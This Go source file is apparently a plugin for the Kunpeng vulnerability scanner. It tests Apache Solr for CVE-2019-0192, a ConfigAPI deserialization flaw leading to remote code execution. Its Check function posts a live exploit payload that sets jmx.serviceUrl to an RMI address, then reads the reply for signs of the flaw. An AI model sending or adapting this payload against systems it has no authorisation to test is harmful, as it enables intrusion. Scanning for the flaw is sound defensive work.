package goplugin

import (
	"encoding/json"
	"net/http"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type apacheSolrRCE struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("solr", &apacheSolrRCE{})
}
func (d *apacheSolrRCE) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "Apache Solr ConfigAPI 远程代码执行",
		Remarks: "ConfigAPI允许通过HTTP POST请求配置Solr的JMX服务器。 通过将其指向恶意RMI服务器，攻击者可以利用Solr的不安全反序列化来触发Solr端的远程代码执行。",
		Level:   0,
		Type:    "RCE",
		Author:  "wolf",
		References: plugin.References{
			URL:  "https://www.seebug.org/vuldb/ssvid-97850",
			CVE:  "CVE-2019-0192",
			KPID: "KP-0080",
		},
	}
	return d.info
}
func (d *apacheSolrRCE) GetResult() []plugin.Plugin {
	var result = d.result
	d.result = []plugin.Plugin{}
	return result
}

func (d *apacheSolrRCE) Check(URL string, meta plugin.TaskMeta) bool {
	poc := `{"set-property":{"jmx.serviceUrl":"service:jmx:rmi:///jndi/rmi://127.0.0.1:56411/vultest"}}`
	var configURL string
	request, err := http.NewRequest("GET", URL+"/solr/admin/cores?wt=json", nil)
	if err != nil {
		return false
	}
	resp, err := util.RequestDo(request, false)
	if err != nil {
		return false
	}
	var core map[string]interface{}
	err = json.Unmarshal(resp.Body, &core)
	if err != nil {
		return false
	}
	if _, ok := core["status"]; !ok {
		return false
	}
	for k := range core["status"].(map[string]interface{}) {
		configURL = "/solr/" + k + "/config"
		break
	}
	if len(configURL) == 0 {
		return false
	}
	request, err = http.NewRequest("POST", URL+configURL, strings.NewReader(poc))
	if err != nil {
		return false
	}
	resp, err = util.RequestDo(request, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "[rmi://127.0.0.1:56411/vultest]") {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
